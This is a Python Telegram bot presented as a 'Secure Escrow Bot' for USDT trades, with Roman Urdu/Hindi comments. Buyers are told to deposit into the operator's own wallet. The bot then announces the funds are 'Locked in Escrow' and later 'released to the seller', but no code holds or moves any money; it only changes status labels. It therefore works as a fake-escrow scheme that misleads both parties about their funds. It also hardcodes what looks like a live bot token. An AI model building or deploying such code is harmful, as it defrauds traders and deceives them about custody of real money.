import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Error logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ⚠️ APNA BOTFATHER TOKEN YAHAN DALEIN
TOKEN = "8557759737:AAFMHaUZSZRxjsHQQ2-uu7ePvk-xzhQRnqM"
# ⚠️ APNA WALLET ADDRESS YAHAN DALEIN (JAHAN BUYER PAISY BHEJAY GA)
MY_WALLET = "User-69d0bc03"

# Deals ko temporary save karne ke liye dictionary
deals = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Secure Escrow Bot!\n\n"
        "Sellers naya trade shuru karne ke liye yeh command likhein:\n"
        "`/create_deal [amount]`\n"
        "Example: `/create_deal 50`"
    )

async def create_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Please enter amount. Example: `/create_deal 50`")
        return
    
    amount = context.args[0] 
    deal_id = str(update.message.message_id)
    seller_id = update.message.from_user.id
    
    deals[deal_id] = {
        "amount": amount,
        "seller": seller_id,
        "buyer": None,
        "status": "PENDING"
    }
    
    keyboard = [[InlineKeyboardButton("🤝 Join as Buyer", callback_data=f"join_{deal_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"💰 *New Escrow Deal Created!*\n\n"
        f"💵 Amount: {amount} USDT\n"
        f"🆔 Deal ID: {deal_id}\n\n"
        f"⚠️ Buyer ko kahein ke neeche diye gaye button par click karke join karein.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data.startswith("join_"):
        deal_id = data.split("_")[1]
        deal = deals.get(deal_id)
        
        if not deal:
            await query.edit_message_text("❌ Deal not found.")
            return
            
        if user_id == deal["seller"]:
            await query.message.reply_text("❌ Seller khud apni deal ka buyer nahi ban sakta!")
            return
            
        deal["buyer"] = user_id
        deal["status"] = "JOINED"
        
        keyboard = [[InlineKeyboardButton("✅ I Have Deposited / Paid", callback_data=f"paid_{deal_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🤝 *Buyer Joined Successfully!*\n\n"
            f"💵 Amount: {deal['amount']} USDT\n"
            f"📥 Please deposit crypto to this wallet address:\n"
            f"`{MY_WALLET}`\n\n"
            f"Paise bhej kar neeche diye gaye button par click karen.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        
    elif data.startswith("paid_"):
        deal_id = data.split("_")[1]
        deal = deals.get(deal_id)
        
        if user_id != deal["buyer"]:
            await query.message.reply_text("❌ Sirf buyer hi deposit confirm kar sakta hai.")
            return
            
        deal["status"] = "HOLD"
        
        keyboard = [[InlineKeyboardButton("🔓 Release Funds (Work Received)", callback_data=f"release_{deal_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔒 *Funds are now Locked in Escrow!*\n\n"
            f"💰 Amount: {deal['amount']} USDT\n"
            f"📢 Seller apna kaam shuru kar sakta hai.\n\n"
            f"Kaam milne ke baad buyer neeche diye gaye button se payment release karega.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        
        # Seller ko notify karna
        try:
            await context.bot.send_message(
                chat_id=deal["seller"],
                text=f"💸 *Notification:* Buyer ne deposit confirm kar diya hai! Paise hold par hain. Aap kaam shuru kar sakte hain."
            )
        except Exception:
            pass

    elif data.startswith("release_"):
        deal_id = data.split("_")[1]
        deal = deals.get(deal_id)
        
        if user_id != deal["buyer"]:
            await query.message.reply_text("❌ Sirf buyer hi payment release kar sakta hai.")
            return
            
        deal["status"] = "COMPLETED"
        await query.edit_message_text("✅ *Deal Completed Successfully!* Funds have been released to the seller.")
        
        # Seller ko notify karna
        try:
            await context.bot.send_message(
                chat_id=deal["seller"],
                text=f"🥳 *Deal Completed!* Buyer ne payment release kar di hai. Apne wallet mein checkout karen."
            )
        except Exception:
            pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("create_deal", create_deal))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()

if __name__ == '__main__':
    main()
  
